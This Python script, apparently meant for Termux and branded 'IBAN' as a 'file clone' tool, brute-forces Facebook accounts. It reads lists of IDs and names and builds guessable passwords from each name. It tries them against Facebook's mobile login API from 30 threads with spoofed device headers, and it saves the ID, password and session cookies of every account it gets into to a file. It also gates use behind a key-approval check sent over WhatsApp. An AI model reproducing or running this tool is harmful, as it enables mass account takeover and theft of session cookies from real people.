#━━━[ MODULE ]━━━#
import os,socket
os.system("pip uninstall requests -y;pip install requests")
from time import sleep
import requests,json,time,re,random,sys,uuid,string,subprocess,zlib,base64,hashlib
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx
from string import *
from concurrent.futures import ThreadPoolExecutor as AISHA
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
#━━━[ COLOUR ]━━━#
GREEN="\33[38;5;46m"
WHITE="\33[1;97m"
RED="\33[1;91m"
BLUE="\33[1;94m"
CYAN="\33[1;96m"
X=f"{GREEN}[\33[1;91m~{GREEN}]"
#━━━[ COUNTER ]━━━#
loop = 0
oks = []
cps = []
id = []
oks=[]
ck=[]
#------------------[ LAWA ]-------------------#
import os, platform, time, sys
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...')
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mFOLLOW MY FACEBOOK ID")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/IBAN.6T9X')
os.system('clear')
def back():
	login()

ah="AHMED-"
imt="-M4786=="
ak="IBAN-"
myid=uuid.uuid4().hex[:10].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'w')
	kok.write(myid+imt)
	kok.close()
def login():
	try:
		token = open('.token.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
			public_menu()
		except KeyError:
			Public()
		except requests.exceptions.ConnectionError:
			clear()
			print(logo)
			print ( ' [×] Connection Timeout')
			exit()
	except IOError:
		Public()
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)

#------------------[ ROSAN ]-------------------# 
#━━━[ USER-AGENT ]━━━#
def M1():
	FBCR = random.choice(["O2.CZ","JAZZTEL","Nepal Telecom","YES OPTUS","Telstra","Telkomsel","null","Tele2 LT","Verizon","Unitel STP","MegaFon","MTN","Movistar","Turk Telekom","T-Mobile","VINAPHONE","LoneStar","UNEFON 4G","MASMOVIL","Grameenphone","Bouygues Telecom","Metfone","AT&amp;amp-T","Astelit-LIFE","Vodafone","XL Axiata","PLAY (T-Mobile)","Digi.Mobil","Verizon Wireless","SAZKAmobilCZ","PosteMobile","TELCEL","lifecell","Yoigo","vodafone.de","PosteMobile","Tele2 LT","Claro BR","O2 - UK","airtel","VIETTEL","U.S. Cellular","Metro by T-Mobile","TelkomSA","Banglalink","VIVACOM","lifecell","S COMVIQ","TRUE-H","GLOBE","VIETTEL","U.S. Cellular","Robi"])
	ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900W8;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
	return ua
#━━━[ <<>> ]━━━#
line="\33[1;94m═"*40
logo=(f"""\033[1;92m

  _____ ____          _   _ 
 |_   _|  _ \   /\   | \ | |
   | | | |_) | /  \  |  \| |
   | | |  _ < / /\ \ | . ` |
  _| |_| |_) / ____ \| |\  |
 |_____|____/_/    \_\_| \_| \033[1;97m1.0

\033[1;97m-------------------------------------------------
\033[1;97mCREATED         \033[1;92mIBAN AHMED
\033[1;97mFACEBOOK        \033[1;92mFACEBOOK.COM/IBAN.6T9X
\033[1;97mGITHUB          \033[1;92mGITHUB.COM/IBAN-971
\033[1;97mTOOL TYPE       \033[1;92mFILE CLONE
\033[1;97mCLONING         \033[1;92mDATA-WIFI
\033[1;97m-------------------------------------------------""")
#━━━[ LINE-X ]━━━#
sys.stdout.write('\x1b]2; IBAN-✓ \x07')
line=f"{BLUE}━"*40
X=f"{GREEN}[\33[1;91m~{GREEN}]"
def linex():print(line)
def clear():os.system("clear");print(logo)   
#━━━[ PASS-SYS ]━━━#
def PASS():
	clear()
	print(f'\033[1;92m[\033[1;97mA\033[1;92m] AUTO PASSWORD')
	print(f'\033[1;92m[\033[1;97mB\033[1;92m] CHOOSE PASSWORD');
	print(f'\033[1;97m-------------------------------------------------')
	passwo=input(f'\033[1;92mPASSWORD \033[1;97m: ')
	if passwo in ["1","A"]:filexd()
	elif passwo in ["2","B"]:file()
	else:PASS()
#━━━[ FILE-AUTO ]━━━#
def file():
    clear()
    print(f'\033[1;92mEXAMPLE   \033[1;97m:  \033[1;92m/sdcard/FILE.txt')
    print(f'\033[1;97m-------------------------------------------------')
    file = input(f'\033[1;92mFILE PATH \033[1;97m: ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{X}{RED} FILE NOT FOUND........');time.sleep(2);PASS()
    plist=[]
    print(f'\033[1;97m-------------------------------------------------')
    try:
        ps_limit = int(input(f'\033[1;92mPASSWORD LIMIT \033[1;97m: '))
    except:
        ps_limit =1
    print(f'\033[1;97m-------------------------------------------------') 
    print(f'\033[1;92mEXAMPLE \033[1;97m: first123 first1234');print(f'\033[1;92mEXAMPLE \033[1;97m: first last firstlast');
    print(f'\033[1;97m-------------------------------------------------') 
    for i in range(ps_limit):
        plist.append(input(f"{GREEN}[\33[1;97m{i+1}{GREEN}] PUT PASSWORD {WHITE}: "))
    with AISHA(max_workers=30) as Aisha:
        clear()
        tl = str(len(fo))
        print(f"TOTAL ID{WHITE} :\33[38;5;46m {tl}")
        print(f"IF NO RESULT ON/OFF AIRPLANE MODE");
        print(f'\033[1;97m-------------------------------------------------')
        for user in fo:
                    ids,names = user.split('|')
                    passlist = plist
                    Aisha.submit(m1,ids,names,passlist)
    exit()
#━━━[ FILE-CHOOSE ]━━━#
def filexd():
    clear()
    print(f"\033[1;92mEXAMPLE \033[1;97m:  \33[1;92m/sdcard/FILE.txt")
    print(f'\033[1;97m-------------------------------------------------') 
    file = input(f'\033[1;92mFILE PATH {WHITE}: ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{X}{RED} FILE NOT FOUND........');time.sleep(2);PASS()
    plist=[]
    plist.append("first@@")
    plist.append("first@")
    plist.append("@@@###")
    plist.append("last@@")
    plist.append("first1234")
    plist.append("first@@@")
    plist.append("first@#")
    plist.append("first last")
    plist.append("firstlast")
    with AISHA(max_workers=30) as Aisha:
        clear()
        tl = str(len(fo))
        print(f"TOTAL ID{WHITE} :\33[38;5;46m {tl}")
        print(f"IF NO RESULT ON/OFF AIRPLANE MODE");
        print(f'\033[1;97m-------------------------------------------------') 
        for user in fo:
                    ids,names = user.split('|')
                    passlist = plist
                    Aisha.submit(m1,ids,names,passlist)
    exit()
#━━━[ METHOD-1 ]━━━#
def m1(ids,names,passlist):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r{GREEN}[\33[1;92mIBAN-✓{GREEN}]{WHITE} [%s|\33[38;5;46m%s{WHITE}]'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            fs = names.split(' ')[0]
            try:
                ls = names.split(' ')[1]
            except:
                ls = fs
            for pw in passlist:
                pas = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',names).replace('name',names.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": pas,
                    "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': M1(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{GREEN}[\33[1;97mIBAN-OK{GREEN}] {ids} | {GREEN}{pas}")
                    oks.append(ids)
                    open('/sdcard/IBAN-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                    break
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:
            m1(ids,names,passlist)
            clear()
def Subscraption():
	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
	clear()
	print(logo)
	r1=requests.get("https://github.com/IBAN-971/Approval./blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
	else:
		os.system("clear")
		print(logo)
		print("\t \033[1;32m First Get Approvel\033[1;37m ")
		time.sleep(1)
		os.system("clear")
		print(logo)
		print("\033[1;32mIBAN TOOL FREE BUT YOU NEED GET APPROVED FIRST\033[1;37m")
		print(f'\033[1;97m-------------------------------------------------')
		print (f'\033[1;92mYour Key is Not Approved ')
		print (f'\033[1;92mCopy And Send Key To Admin ')
		print (f'\033[1;92mYour Key \033[1;97m:'   +ak+ah+key1 )
		print(f'\033[1;97m-------------------------------------------------')
		name = input(f'\033[1;92mYour Name \033[1;97m:')
		input(f'\033[1;92mPress Enter To Send Key')
		time.sleep(3.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20' +ak+ah+key1
		os.system('am start https://wa.me/+8801929667182?text=' + tks)
		
Subscraption()